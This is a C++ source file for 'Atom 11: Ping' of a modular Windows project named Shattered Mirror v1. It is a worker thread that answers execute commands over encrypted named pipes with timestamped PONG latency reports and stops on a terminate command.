/*=============================================================================
 * Shattered Mirror v1 — Atom 11: Ping (Latency Probe)
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends PONG report on report pipe.
 *===========================================================================*/

#include "Atom_11_Ping.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <cstdio>
#include <cstring>

DWORD WINAPI PingAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;

  // 1. Connect to command pipe (receive ping command)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe)
    return 1;

  // 2. Connect to report pipe (send PONG response)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    CloseHandle(hCmdPipe);
    return 1;
  }

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY on report pipe
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

  // Wait for CMD_EXECUTE on command pipe
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          // Capture high‑resolution timestamp
          LARGE_INTEGER qpc;
          QueryPerformanceCounter(&qpc);

          // Format report: "PONG|<QPC value>"
          char report[128];
          snprintf(report, sizeof(report), "PONG|%lld", qpc.QuadPart);

          // Send immediate reply on report pipe
          IPC_MESSAGE outMsg = {0};
          outMsg.dwSignature = 0x534D4952;
          outMsg.CommandId = CMD_REPORT;
          outMsg.dwPayloadLen = (DWORD)strlen(report);
          memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
          IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);

          // Do not break; stay alive for subsequent ping commands
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          break;
        }
      }
    }
    Sleep(50);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}